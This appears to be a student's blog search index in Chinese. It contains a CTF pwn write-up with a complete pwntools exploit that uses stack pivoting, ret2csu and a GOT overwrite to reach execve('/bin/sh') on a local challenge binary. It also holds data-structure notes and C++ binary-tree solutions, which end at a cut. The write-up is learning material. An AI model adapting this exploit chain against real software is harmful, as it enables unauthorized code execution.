{"meta":{"title":"は永遠に不滅である","subtitle":"击碎你沉睡的灵魂！","description":"我们从不回头","author":"4riH04X","url":"http://example.com","root":"/"},"pages":[{"title":"categories","text":"","path":"categories/index.html","date":"11-02","excerpt":""},{"title":"About Me","text":"# 0. 论前世，不问来者 热爱学习的小菜鸡、又菜又爱玩的小菜鸡、一窍不通但一腔热血的小菜鸡...... 一句话送给此时的我和此时正在看的你： “种一棵树最好的时间是十年前，其次是现在！” # 1. 个人简介 船带网安学子一枚，手贱高考还填报了法学专业，因此笨人是 “高贵” 的网安法双学位学生。 见笑了，没学过法律的小菜鸡。 喜欢数据分析，二进制安全。另外引师傅们的自我介绍：“自学二进制漏洞，是个 pwn 究极菜鸡” 但足够热爱，足矣。又想起两句话： “有人问我，你害怕死亡吗？” “答曰：若立足年成天地之魄，死又何妨” 当坚持热爱每一天的生活，当把每分每秒塞满时，这是极其幸福的。 # 2.ID 解读 4riH04X，疯癫之意，希望能不顾牲命，H04X 即是 HOAX 疯狂、疯癫。 “即是我认定的巅峰，无顾艰辛，亦为此疯癫，纵千年无名” 希望能以此 ID 自嘲并鼓励自己不顾他人眼光，自我陶醉吧！ ~“Past lives couldn't ever hold me” ~&quot;Don't wake me, I'm not dreamin'&quot; # 3. 未来展望 借此博客的开辟，记录一下自己的学习体会和个人对一些知识浅薄的理解。 更多的希望自己借此博客激励自己， “仰天大笑出门去，我辈岂是蓬蒿人！”","path":"about/index.html","date":"11-02","excerpt":""},{"title":"404","text":"","path":"404/index.html","date":"11-02","excerpt":""},{"title":"friends","text":"# 友人帐 这些人都是巨佬，浅浅挂一下希望别骂我，，， tld 糊涂涂の博客","path":"friends/index.html","date":"11-05","excerpt":""},{"title":"search","text":"","path":"search/index.html","date":"11-02","excerpt":""},{"title":"links","text":"# 0. 说明 这里存放了一些实用的网站！！！持续更新，可以给我留言","path":"links/index.html","date":"11-05","excerpt":""}],"posts":[{"title":"常见漏洞","text":"慢慢更新，开始投入 # 1.ret2text # 2.ret2syscall # 3.ret2libc # 4.ret2shellcode # # 5.ret2dl # 6.fmt # UAF unlink off-by-null kernelrop double-fetch musl-pwn web-pwn","path":"CTF/Pwn/note/Pwn题型/","date":"11-18","excerpt":"","tags":[{"name":"Pwn","slug":"Pwn","permalink":"http://example.com/tags/Pwn/"}]},{"title":"一个只有read的程序","text":"​ 近期都很忙，突发奇想在二进制✌（）的引导下想完成这一道所谓的中等题😊😊😊（在这之前补充一下，聊到了凌晨 4 点，现在身心俱疲。） 此前一直做一些简单的板子题度日，堆只看不碰，栈只挑简单的做，真的可恶啊！ # 1.read 原程序 ​ 只有一个 read，明显栈溢出，至于怎么溢出，额，待会细琐。当然这里一眼看过去，shellcode 是最好想到的啊，我们简单看看保护和 vmmap 看看有没有 行高亮1234567解释64位程序，小端序开启部分RELRO-----got表仍可写未开启canary保护-----存在栈溢出开启NX保护-----堆栈不可执行 其实这里没必要看vmmap了，算了熟悉一下指令吧未开启PIE-----程序地址为真实地址动态链接 ​ 显然，这里没有像静态链接程序固定带有的 mprotect 函数，可以去修改内存页的权限为 rwxp，（再调用 read 函数将 pwntools 生成的 shellcode 代码注入到 addr 中，之后再将 read 函数返回地址写为 addr 地址，调用 shellcode，获得 shell），而且就算可以改，也没办法泄露 addr，这个想法被 pass 了。 # 2. 一个可行的 idea - 拓展到栈上的 ret2dl 以前只是见过，今天来实操一下。😋，当然 t1d 说这个题用它做不出来。 # ret2dl 介绍 ​ 对于 NO RELRO 的情况，我们可以利用 read 函数修改 .dynamic 段中的 .dynstr 节的地址，将其修改为我们可控制的地址。然后我们可以在这个地址上构造一个伪造的 fake_dynstr ，将其中的某个字符串替换为 system 函数的字符串。 ​ 接下来，我们可以调用 .dl_fixup 函数，它会解析我们修改的字符串所对应的原函数。 _dl_fixup 函数根据字符串（也就是函数名）来索引函数，因此最终会解析 system 函数。 ​ 无论是 32 位还是 64 位，实现这个过程都相对简单。具体步骤如下： 行高亮1234找到.dynamic段并获取.dynstr节的地址（STRTAB的d_ptr）。使用read函数将.dynstr的地址修改为我们可控制的地址。在可控制的地址上构造一个fake_dynstr，将其中的某个字符串替换为system函数的字符串。调用.dl_fixup函数，它会解析我们修改的字符串所对应的原函数，即system函数。 注：如果是 FULL RELERO ，程序在运行之前就已经调用了 ld.so 将所需的外部函数加载完成，程序运行期间不进行动态加载，因此，在程序的 got 表中， link_map 和 dl_runtime_resolve 函数的地址都为 0 可以参考：【精选】ret2dlresolve 超详细教程 (x86&amp;x64)-CSDN 博客 # 本题的具体实践 ​ 显然，除了上述方法中通过调用 system(&quot;/bin/sh&quot;) 和打 one_gadget 来 getshell 以外，还有一种常见方式就是通过触发 syscall 软中断来 getshell，然而，本题的 ELF 源文件中并没有 syscall 这个 gadget ，并且，我们又无法泄露 libc 信息，用 libc 中的 syscall ，因此，我们需要想办法创造出 syscall 这个 gadget。 ​ 在 t1d 的指引下，我去回顾了一遍 read,write 这些函数。参考文章：ctf 中关于 syscall 系统调用的简单分析 - 知乎 (zhihu.com) 行高亮1234567891011121314151617read()： ssize_t read(int fd,const void *buf,size_t nbytes); //fd 为要读取的文件的描述符 0 //buf 为要读取的数据的缓冲区地址 //nbytes 为要读取的数据的字节数 //read() 函数会从 fd 文件中读取 nbytes 个字节并保存到缓冲区 buf， //成功则返回读取到的字节数（但遇到文件结尾则返回0），失败则返回 -1。write() ssize_t write(int fd,const void *buf,size_t nbytes); //fd 为要写入的文件的描述符 1 //buf 为要写入的数据的缓冲区地址 //nbytes 为要写入的数据的字节数 //write() 函数会将缓冲区 buf 中的 nbytes 个字节写入文件 fd， //成功则返回写入的字节数，失败则返回 -1。 ​ 其实，在 libc 中，read，write，close，alarm 等等这些函数只是对系统调用进行了简单的封装，在这些函数中都存在 syscall 这个 gadget，且 syscall 一般离函数的开始地址都很近，故可以将这些函数的 got 表改为 syscall 的地址，从而触发系统调用。 同样我们可以具体看看 ida 里面 read 的汇编：本题的不知道为啥没显示 syscall，显示的是 call😋，下面是博客里的，看着更清晰一点。 行高亮12345将read的系统调用号 0 赋值给 rax将 read的第一个参数0 （fd） 赋值给了 rdi将 read的第二个参数 buf 赋值给了 rsi将 read的第二个参数 buf 赋值给了 rdx即系统调用了 read(0,&amp;buf,0x400) ​ 😋, 要是所有题目都可以直接去把 read 的 got 表改成 syscall，再修改参数执行就好了（） ​ 好了，我们知道，在 64 位中，要想成功 getshell，需要控制的寄存器如下： 行高亮12345rax = 0x3brdi = bin_sh_addrrsi = 0rdx = 0syscall ​ 因此针对本题的思路如下： ​ 我们可以用 ret2csu 先改写 read 的 got 表为 syscall 的地址，有了 syscall 后，再由 read 读入的字节数控制 rax 寄存器（同时读入 /bin/sh 字符串），并用 ret2csu 控制 rdi，rsi，rdx 三个参数，最后调用触发 syscall 即可。t1d 说的大致相同，那我先去实搓了，回来接着写，万一还有坑，做不出来就是🤡了。 2023-11-17 10:53:07 2023-11-18 19:31:07 # 3. 小丑归来🤡 本题目的难点在栈迁，，，，（对我这个菜🐕来说） ​ 断断续续鏖战 1 天，在师傅的敲打下，该碰的坑都碰，先总结得失： 1. 做题要动态调试，一下午可能跑了两三次吧，画表格布栈、打草稿，等等，这些都不如动调来的快 2. 栈迁移的技巧：直接把返回地址写成 read 的 lea rax, [rbp+buf] ，把 rbp 改成想迁移到的地址，这个地址有考究，待会认真说。 3. 巧妙利用 read 实现任意写，布链子。 待会说，自闭了，板子题只是基础，要多见新题，基础打牢，多调题目。 整体来说，对这个 “简单” 的做法还是存在一些疑惑，等弄懂了回来更新。 # 1）栈迁移 一些学习的博客： 栈迁移的原理 &amp;&amp; 实战运用 - ZikH26 - 博客园 (cnblogs.com) 哎，少看，多实践 针对本题具体的是迁移到 read 的虚拟栈，em，还要再学习一下回来具体补充 # 2）ROP 链 像 ret2syscall 一样，直接调用 read_plt # 3）用 csu 改 got 当然这里是和 4 结合在一起的，用 read 控制输入为 0x3b 调节 rax 实现改 got 同时调用 syscall 的作用 # 4.exp 行高亮123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172#seccomp-tools dump ./pwn.pwn看哪些被禁用了#栈劫持就是先讨论main函数里的栈迁移，首先利用溢出把ebp的内容给修改掉（修改成我们要迁移的那个地址）#并且把返回地址填充成leave;ret指令的地址（因为我们需要两次leave;ret）#execve：59号系统调用 execve(&quot;/bin/sh&quot;,0,0) r12中填入exceve的地址，其余寄存器置0。#希望控制寄存器为：#rax = 0x3b syscall#rdi = bin_sh_addr#rsi = 0#rdx = 0#syscallfrom pwn import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;) p = process(&quot;./pwn.pwn&quot;)elf = ELF(&quot;./pwn.pwn&quot;)#ret2csu的两个gadget#loc_4011B6: pop_rbx_addrgadget1_addr = 0x4011ba#loc_4011A0: mov_rdx_r14_addr gadget2_addr = 0x4011A0 read_plt = elf.plt[&#x27;read&#x27;]read_got = elf.got[&#x27;read&#x27;]#定义利用csu的通用gadget函数#rdi,rsi,rdxdef com_gadget(addr1 , addr2 , jmp2 , arg1 , arg2 , arg3): payload = p64(addr1) + p64(0) + p64(1) + p64(arg1) + p64(arg2) + p64(arg3) + p64(jmp2) + p64(addr2) + b&#x27;a&#x27;*56 # csu = pop_rbx_addr , rbx , rbp , r12 , r13 , r14 , r15 , mov_rdx_r14_addr 56个对应那几个pop return payload gdb.attach(p)pause()#1核心是两次leave_ret#迁移栈：到read的虚拟栈#retret = 0x4040c0+0xa0#leave_ret#read的jmp指令地址leave_ret = 0x401132#rbp放回去的地址payload = b&#x27;a&#x27;*0xa0 #覆盖到返回地址payload += p64(ret) + p64(leave_ret)p.send(payload)pause()#2ROP链条#调用syscallpop_rsi_r15=0x4011c1#参数1的地址0x404200#参数2：0#调用修改后的read-&gt;syscallpayload = p64(pop_rsi_r15)+p64(0x404200)+p64(0)+p64(read_plt)#3调用read修改got表 0x404200-&gt;binsh 0 0payload += com_gadget(gadget1_addr, gadget2_addr, read_got, 0x404200,0,0)#栈迁到read_got的位置并执行leave_ret-&gt;readpayload = payload.ljust(0xa0, b&#x27;a&#x27;)+ p64(read_got+0xa0) + p64(leave_ret)p.send(payload)pause()#4.控制read的读入字节控制rax，实现syscallp.send(b&#x27;\\xd0&#x27;)p.send(b&#x27;/bin/sh\\x00&#x27; + b&#x27;a&#x27;*(0x3b-8))p.interactive() # 5. 更新","path":"CTF/Pwn/solutions/learn/read/","date":"11-17","excerpt":"","tags":[{"name":"Pwn","slug":"Pwn","permalink":"http://example.com/tags/Pwn/"}]},{"title":"图的学习","text":"# 数据结构与算法：图的学习 # 一。图的一些术语学习 # 1. 图的基本区分 ** 无向图：任意两个节点之间的 “边”** 没有方向，可以用（a，b）表示 ** 无向图：** 任意两个节点之间的 “弧” 都有方向，可以用 &lt;a,b&gt; 表示，表示 a 到 b 的弧 # 2. 图的基本概念 学习图的算法前，这之前先学习图的几种存储方式 # 二。图的存储方式 # 1. 邻接矩阵 # 2. 邻接表","path":"computer-science/Data-Structures/cpp/图/","date":"11-14","excerpt":"","tags":[{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"http://example.com/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"}]},{"title":"写作模板","text":"这里是写作模板，一般点开此文件复制编辑写文章","path":"模板/","date":"11-12","excerpt":"","tags":[{"name":"博客说明","slug":"博客说明","permalink":"http://example.com/tags/%E5%8D%9A%E5%AE%A2%E8%AF%B4%E6%98%8E/"}]},{"title":"2023大创介绍","text":"...... # 项目简介 ​ 网络犯罪随技术发展而日益泛滥，现有的侦查取证技术却无法满足司法实务需要，让不法分子有可乘之机，严重威胁了个人信息、公民财产乃至国家安全。项目基于前期调研，研究 Android 流量分析技术，拟用 VPN 代理采集流量，集成强化学习模型与 LLMs，基于 LSTM 与 LightGBM 等模型实现本地轻量化；实现应用恶意行为粗识别与风险预警；服务端精检测、有效检出恶意流量并分析取证；结合诉讼法和证据法评估分析并搭建一个基于 B/S 架构的分析报告查询与经验交流网页。 # 项目创新点 1.AI 赋能 Network Traffic Analysis，集成强化学习和 LLMs 高效检出恶意流量，提升 Android、HarmonyOS 应用生态质量。 2. 借助大样本集强化特征工程，构建基于目的、时域等属性的多维特征库。 3. 数字赋能刑事取证突破网络犯罪，搭建辅助取证平台，协查并提供证据线索。","path":"Project/DaChuang/大创介绍/","date":"11-12","excerpt":"","tags":[{"name":"大创","slug":"大创","permalink":"http://example.com/tags/%E5%A4%A7%E5%88%9B/"}]},{"title":"二叉树题解","text":"# 二叉树部分题解 大二上学期，做了一些树的题放一些个人的题解，正在熟悉 C++, 闲来无事时可以翻看。嘿嘿 行高亮123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564565566567568569570571572573574575576577578579580581582583584585586587588589590591592593594595596597598599600601602603604605606607608609610611612613614615616617618619620621622623624625626627628629630631632633634635636637638639640641642643644645646647648649650651652653654655656657658659660661662663664665666667668669670671672673674675676677678679680681682683684685686687688689690691692693694695696697698699700701702703704705706707708709710711712713714715716717718719720721722723724725726727728729730731732733734735736737738739740741742743744745746747748749750751752753754755756757758759760761762763764765766767768769770771772773774775776777778779780781782783784785786787788789790791792793794795796797798799800801802803804805806807808809810811812813814815816817818819820821822823824825826827828829830831832833834835836837838839840841842843844845846847848849850851852853854855856857858859860861862863864865866867868869870871872873874875876877878879880881882883884885886887888889890891892893894895896897898899900901902903904905906907908909910911912913914915916917918919920921922923924925926927928929930931932933934935936937938939940941942943944945946947948949950951952953954955956957958959960961962963964965966967968969970971972973974975976977978979980981982983984985986987988989990991992993994995996997998999100010011002100310041005100610071008100910101011101210131014101510161017101810191020102110221023102410251026102710281029103010311032103310341035103610371038103910401041104210431044104510461047104810491050105110521053105410551056105710581059106010611062106310641065106610671068106910701071107210731074107510761077107810791080108110821083108410851086108710881089109010911092109310941095109610971098109911001101110211031104110511061107110811091110111111121113111411151116111711181119112011211122112311241125112611271128112911301131113211331134113511361137113811391140114111421143114411451146114711481149115011511152115311541155115611571158115911601161116211631164116511661167116811691170117111721173117411751176117711781179118011811182118311841185118611871188118911901191119211931194119511961197119811991200120112021203120412051206120712081209121012111212121312141215121612171218121912201221122212231224122512261227122812291230123112321233123412351236123712381239124012411242124312441245124612471248124912501251125212531254125512561257125812591260126112621263126412651266126712681269127012711272127312741275127612771278127912801281128212831284128512861287128812891290129112921293129412951296129712981299130013011302130313041305130613071308130913101311131213131314131513161317131813191320132113221323132413251326132713281329133013311332133313341335133613371338133913401341134213431344134513461347134813491350135113521353135413551356135713581359136013611362136313641365136613671368136913701371137213731374/******************************************************************************** 1.相同的树*/#include &lt;iostream&gt;#include &lt;vector&gt;#include &lt;queue&gt;#include &lt;sstream&gt;#include &lt;limits&gt;#include &lt;cmath&gt;using namespace std;//数据结构一：常规二叉树struct TreeNode1 &#123; int val; TreeNode1* left; TreeNode1* right; TreeNode1(int x) : val(x), left(nullptr), right(nullptr) &#123;&#125;&#125;;// 将数组转换为层序二叉树的函数TreeNode1* arrayToTree1(const vector&lt;string&gt;&amp; arr) &#123; if (arr.empty()) &#123; return nullptr; &#125; // 构建根节点 TreeNode1* root = new TreeNode1(stoi(arr[0])); queue&lt;TreeNode1*&gt; q; q.push(root); int i = 1; while (!q.empty() &amp;&amp; i &lt; arr.size()) &#123; TreeNode1* current = q.front(); q.pop();//stoi是C++中的一个函数，用于将字符串转换为整数。它的完整名称是std::stoi，属于&lt;string&gt;头文件中的函数。 // 构建左子树节点 if (arr[i] != &quot;null&quot;) &#123; current-&gt;left = new TreeNode1(stoi(arr[i])); q.push(current-&gt;left); &#125; i++; // 构建右子树节点 if (i &lt; arr.size() &amp;&amp; arr[i] != &quot;null&quot;) &#123; current-&gt;right = new TreeNode1(stoi(arr[i])); q.push(current-&gt;right); &#125; i++; &#125; return root;&#125;// 判断两个二叉树是否相同的函数bool isSameTree1(TreeNode1* p, TreeNode1* q) &#123; if (p == nullptr &amp;&amp; q == nullptr) &#123; return true; &#125; if (p == nullptr || q == nullptr) &#123; return false; &#125; return (p-&gt;val == q-&gt;val) &amp;&amp; isSameTree1(p-&gt;left, q-&gt;left) &amp;&amp; isSameTree1(p-&gt;right, q-&gt;right);&#125;// 释放二叉树内存的函数void deleteTree1(TreeNode1* root) &#123; if (root == nullptr) &#123; return; &#125; deleteTree1(root-&gt;left); deleteTree1(root-&gt;right); delete root;&#125;int main_1() &#123; string arrayString1; getline(cin, arrayString1);//getline可以读入空格，以换行结束/* // 找到第一个数组部分的起始位置和结束位置 size_t start1 = input.find(&#x27;[&#x27;); size_t end1 = input.find(&#x27;]&#x27;); // 提取第一个数组部分的字符串 string arrayString1 = input.substr(start1 + 1, end1 - start1 - 1); // 找到第二个数组部分的起始位置和结束位置 size_t start2 = input.find(&#x27;[&#x27;, end1 + 1); size_t end2 = input.find(&#x27;]&#x27;, start2 + 1); // 提取第二个数组部分的字符串 string arrayString2 = input.substr(start2 + 1, end2 - start2 - 1);*/ string arrayString2; getline(cin, arrayString2);//getline可以读入空格，以换行结束 // 解析输入字符串为字符串数组1 vector&lt;string&gt; arr1; stringstream ss1(arrayString1); string token1; while (getline(ss1, token1, &#x27;,&#x27;)) &#123; arr1.push_back(token1); &#125; // 解析输入字符串为字符串数组2 vector&lt;string&gt; arr2; stringstream ss2(arrayString2); string token2; while (getline(ss2, token2, &#x27;,&#x27;)) &#123; arr2.push_back(token2); &#125; if (arr1.size() != arr2.size()) &#123; cout &lt;&lt; &quot;false&quot; &lt;&lt; endl; &#125; else &#123; // 构建第一个二叉树 TreeNode1* p = arrayToTree1(arr1); // 构建第二个二叉树 TreeNode1* q = arrayToTree1(arr2); // 判断两个二叉树是否相同 bool result = isSameTree1(p, q); cout &lt;&lt; boolalpha &lt;&lt; result &lt;&lt; endl; // 释放二叉树内存 deleteTree1(p); deleteTree1(q); &#125; return 0;&#125;/*********************************************************************************2.二叉树的中序遍历,判断它是不是镜面对称*/// 判断二叉树是否对称的辅助函数bool isSymmetricHelper2(TreeNode1* leftNode, TreeNode1* rightNode) &#123; // 左子树和右子树都为空，对称 if (leftNode == nullptr &amp;&amp; rightNode == nullptr) &#123; return true; &#125; // 左子树或右子树有一个为空，不对称 if (leftNode == nullptr || rightNode == nullptr) &#123; return false; &#125; // 判断左子树的左子树和右子树的右子树是否对称，以及左子树的右子树和右子树的左子树是否对称 return (leftNode-&gt;val == rightNode-&gt;val) &amp;&amp; isSymmetricHelper2(leftNode-&gt;left, rightNode-&gt;right) &amp;&amp; isSymmetricHelper2(leftNode-&gt;right, rightNode-&gt;left);&#125;// 判断二叉树是否对称bool isSymmetric2(TreeNode1* root) &#123; if (root == nullptr) &#123; return true; &#125; return isSymmetricHelper2(root-&gt;left, root-&gt;right);&#125;int main_2() &#123; string arrayString1; getline(cin, arrayString1);//getline可以读入空格，以换行结束 // 解析输入字符串为字符串数组1 vector&lt;string&gt; arr1; stringstream ss1(arrayString1); string token1; while (getline(ss1, token1, &#x27;,&#x27;)) &#123; arr1.push_back(token1); &#125; //构建树 TreeNode1* p = arrayToTree1(arr1); if (isSymmetric2(p)) &#123; cout &lt;&lt; &quot;true&quot; &lt;&lt; endl; &#125; else cout &lt;&lt; &quot;false&quot; &lt;&lt; endl; return 0;&#125;/******************************************************************************3: 翻转二叉树给你一棵二叉树的根节点 root ，翻转这棵二叉树，并返回其根节点。*/// 交换二叉树的左右子树void swapLeftAndRight3(TreeNode1* root) &#123; if (root == nullptr) &#123; return; &#125; // 交换左右子树 TreeNode1* temp = root-&gt;left; root-&gt;left = root-&gt;right; root-&gt;right = temp; // 递归交换左右子树 swapLeftAndRight3(root-&gt;left); swapLeftAndRight3(root-&gt;right);&#125;//现在已经知道num//算当前层数int calculateHeight3(int num) &#123; int height = 0; while (pow(2, height) - 1 &lt; num) &#123; height++; &#125; return height;&#125;//满二叉树最多有几个节点int calculateNodeCount3(int height) &#123; return pow(2, height) - 1;&#125;// 层序遍历二叉树void levelOrderTraversal3(TreeNode1* root,int num) &#123; if (root == nullptr) &#123; return; &#125; queue&lt;TreeNode1*&gt; q; q.push(root); int i = 0,null=0; while (!q.empty()) &#123; i++; TreeNode1* current = q.front(); q.pop(); if (current) &#123; cout &lt;&lt; current-&gt;val; if (current-&gt;left || current-&gt;right) &#123; if (current-&gt;left) &#123; q.push(current-&gt;left); &#125; else &#123; q.push(nullptr); null++; &#125; if (current-&gt;right) &#123; q.push(current-&gt;right); &#125; else &#123; q.push(nullptr); null++; &#125; &#125; else if (i &lt; num) &#123; q.push(nullptr); q.push(nullptr); null += 2; &#125; &#125; else &#123; null--; cout &lt;&lt; &quot;null&quot;; &#125; if (null == q.size()) break; if (!q.empty()) &#123; cout &lt;&lt; &quot;,&quot;; &#125; &#125;&#125;int main_3() &#123; string arrayString1; getline(cin, arrayString1);//getline可以读入空格，以换行结束 int num = 0; // 解析输入字符串为字符串数组1 vector&lt;string&gt; arr1; stringstream ss1(arrayString1); string token1; while (getline(ss1, token1, &#x27;,&#x27;)) &#123; arr1.push_back(token1); num++; &#125; int height = calculateHeight3(num); int num1 = calculateNodeCount3(height-1); //构建树 TreeNode1* p = arrayToTree1(arr1); swapLeftAndRight3(p); levelOrderTraversal3(p,num1); return 0;&#125;//1,2,2,3,4,4,5,5,null,5,5,4,4,3,4,null,5,4/*4: 左叶子之和题目描述给定二叉树的根节点 root ，返回所有左叶子之和。输入描述一个节点序列输出描述返回其左叶子之和*/// 加二叉树左树叶子void Addleft4(TreeNode1* root) &#123; if (root == nullptr) &#123; cout &lt;&lt; &quot;0&quot; &lt;&lt; endl; return; &#125; if (!(root-&gt;left || root-&gt;right)) &#123; cout &lt;&lt; &quot;0&quot; &lt;&lt; endl; return; &#125; int num = 0; int flag = 0; queue&lt;TreeNode1*&gt; q; TreeNode1* a = new TreeNode1(-1); q.push(root); while (!q.empty()) &#123; TreeNode1* current = q.front(); q.pop(); if (current-&gt; val==- 1) &#123; flag = 1; //cout &lt;&lt; flag&lt;&lt;&quot; &quot;&lt;&lt;q.front()-&gt;val &lt;&lt; endl; continue; &#125; else if (current) &#123; if (current-&gt;left || current-&gt;right) &#123; if (current-&gt;left) &#123; q.push(a);//左子树前先加个-1进去 q.push(current-&gt;left); &#125; if (current-&gt;right) &#123; q.push(current-&gt;right); &#125; flag = 0; &#125; else if (flag == 1 &amp;&amp; current &amp;&amp; !(current-&gt;left || current-&gt;right)) &#123; // cout &lt;&lt; current-&gt;val &lt;&lt; endl; num += current-&gt;val; //cout &lt;&lt; num &lt;&lt; endl; flag = 0; &#125; else; &#125; &#125; cout &lt;&lt; num &lt;&lt; endl;&#125;int main_4() &#123; string arrayString1; getline(cin, arrayString1);//getline可以读入空格，以换行结束 // 解析输入字符串为字符串数组1 vector&lt;string&gt; arr1; stringstream ss1(arrayString1); string token1; while (getline(ss1, token1, &#x27;,&#x27;)) &#123; arr1.push_back(token1); &#125; //构建树 TreeNode1* p = arrayToTree1(arr1); Addleft4(p); return 0;&#125;/******************************************************************5.*构建最小二叉搜索树*/// 递归构建二叉搜索树//分治思想int BSTnum = 0;TreeNode1* buildBST5(vector&lt;string&gt; nums, int start, int end) &#123; if (start &gt; end) &#123; return NULL; &#125; else BSTnum++; int mid = 0; if (end - start % 2 == 0) &#123; mid = start + (end - start) / 2; &#125; else &#123; mid = start + (end - start+1)/ 2; &#125; //cout &lt;&lt; mid &lt;&lt; endl; TreeNode1* root = new TreeNode1(stoi(nums[mid])); root-&gt;left = buildBST5(nums, start, mid - 1); root-&gt;right = buildBST5(nums, mid + 1, end); return root;&#125;// 创建高度最小的二叉搜索树TreeNode1* createMinimalBST(vector&lt;string&gt; nums) &#123; // cout &lt;&lt; nums.size() - 1 &lt;&lt; endl; return buildBST5(nums, 0, nums.size()-1);&#125;int main_5() &#123; string arrayString1; getline(cin, arrayString1);//getline可以读入空格，以换行结束 // 解析输入字符串为字符串数组1 vector&lt;string&gt; arr1; stringstream ss1(arrayString1); string token1; int num = 0; while (getline(ss1, token1, &#x27;,&#x27;)) &#123; arr1.push_back(token1); num++; &#125; //构建树 TreeNode1* p = createMinimalBST(arr1); int height = calculateHeight3(BSTnum); int num1 = calculateNodeCount3(height - 1); levelOrderTraversal3(p,num1); return 0;&#125;/*第6题 给定完美二叉树，填充每个右指针struct Node &#123;int val;Node *left;Node *right;Node *next;&#125;填充它的每个 next 指针，让这个指针指向其下一个右侧节点。如果找不到下一个右侧节点，则将 next 指针设置为 NULL。初始状态下，所有 next 指针都被设置为 NULL。输入描述给一个完美二叉树输出描述输出填充它的每个 next 指针，让这个指针指向其下一个右侧节点。如果找不到下一个右侧节点，则将 next 指针设置为 NULL。输入输出样例输入root = [1,2,3,4,5,6,7]输出[1,#,2,3,#,4,5,6,7,#] 输入root = []输出[]*///有next的树节点struct TreeNextNode6 &#123; int val; TreeNextNode6* left; TreeNextNode6* right; TreeNextNode6* next; TreeNextNode6(int x) : val(x), left(nullptr), right(nullptr), next(nullptr)&#123;&#125;&#125;;int ErCiFang(int i) &#123; int n = 2; int num = 0; while(1) &#123; num += n; n *= 2; if (num == i) &#123; return 1; &#125; else if (num &gt; i) &#123; return 0; &#125; else continue; &#125;&#125;//构造有next指针的树//但给的数组里面没有null，因此不能直接给第9题用TreeNextNode6* PerfectTree6(vector&lt;string&gt;&amp; Tree) &#123; if (Tree.empty()) &#123; return nullptr; &#125; TreeNextNode6 *root = new TreeNextNode6(stoi(Tree[0])); root-&gt;next = nullptr; queue&lt;TreeNextNode6*&gt; q; q.push(root); int i = 1; int ans = 0; while (1) &#123; TreeNextNode6* current = q.front(); // cout &lt;&lt; &quot;存入:&quot; &lt;&lt; current-&gt;val&lt;&lt;endl; q.pop(); ans++; //构建next指针 if (!q.empty()) &#123; TreeNextNode6* next = q.front(); if (ErCiFang(ans-1)) &#123; current-&gt;next = nullptr; // cout &lt;&lt; &quot;产生一个#&quot; &lt;&lt; endl; &#125; else &#123; // cout&lt;&lt;current-&gt;val &lt;&lt; &quot;产生一个next是&quot;; current-&gt;next = next; // cout &lt;&lt; next-&gt;val &lt;&lt; endl; &#125; &#125; // 构建左子树节点 if (i &lt; Tree.size()) &#123; current-&gt;left = new TreeNextNode6(stoi(Tree[i])); q.push(current-&gt;left); //cout &lt;&lt; &quot; mama&quot; &lt;&lt; current-&gt;val &lt;&lt; &quot;mama &quot;; &#125; i++; // 构建右子树节点 if (i &lt; Tree.size())&#123; current-&gt;right = new TreeNextNode6(stoi(Tree[i])); q.push(current-&gt;right); &#125; i++; if (q.empty()) &#123; break; &#125; &#125; return root;&#125;// next层序遍历二叉树void LevelTraversalPerfectTree6(TreeNextNode6* root) &#123;//完美树不存在空树 if (root == nullptr) &#123; cout &lt;&lt; &#x27; &#x27; &lt;&lt; endl; return; &#125; queue&lt;TreeNextNode6*&gt; q; q.push(root); while (root-&gt;left) &#123;//先存入全部最左元素 q.push(root-&gt;left); root = root-&gt;left; &#125; while (!q.empty()) &#123; TreeNextNode6* current = q.front(); q.pop(); while (current) &#123; cout &lt;&lt; current-&gt;val &lt;&lt; &quot;,&quot;; current = current-&gt;next; &#125; if (!q.empty()) &#123; cout &lt;&lt; &quot;#,&quot;; &#125; else cout &lt;&lt; &quot;#&quot; &lt;&lt; endl; &#125;&#125;int main_6() &#123; string arrayString1; getline(cin, arrayString1);//getline可以读入空格，以换行结束 // 解析输入字符串为字符串数组1 vector&lt;string&gt; arr1; stringstream ss1(arrayString1); string token1; while (getline(ss1, token1, &#x27;,&#x27;)) &#123; arr1.push_back(token1); &#125; //构建完美树 TreeNextNode6* p = PerfectTree6(arr1); // cout &lt;&lt; &quot;构建成功&quot; &lt;&lt; endl; LevelTraversalPerfectTree6(p); return 0;&#125;/*7: 二叉树的最近公共祖先题目描述给定一个二叉树, 找到该树中两个指定节点的最近公共祖先。（一个节点也可以是它自己的祖先）。输入描述给一个二叉树输出描述输出它的最近公共近邻输入输出样例输入root = [3,5,1,6,2,0,8,null,null,7,4], p = 5, q = 1输出3输入root = [1,2], p = 1, q = 2输出1*/struct ParentTreeNode7 &#123; int val; int ans; ParentTreeNode7* left; ParentTreeNode7* right; ParentTreeNode7* parent; ParentTreeNode7(int x, int y) : val(x), ans(y),left(nullptr), right(nullptr), parent(nullptr) &#123;&#125;&#125;;// 将数组转换为有父母的层序二叉树的函数ParentTreeNode7* ParentTree7(const vector&lt;string&gt;&amp; arr) &#123; if (arr.empty()) &#123; return nullptr; &#125; int ans = 1; // 构建根节点 ParentTreeNode7* root = new ParentTreeNode7(stoi(arr[0]),ans); root-&gt;parent = root; queue&lt;ParentTreeNode7*&gt; q; q.push(root); ans++; int i = 1; while (!q.empty() &amp;&amp; 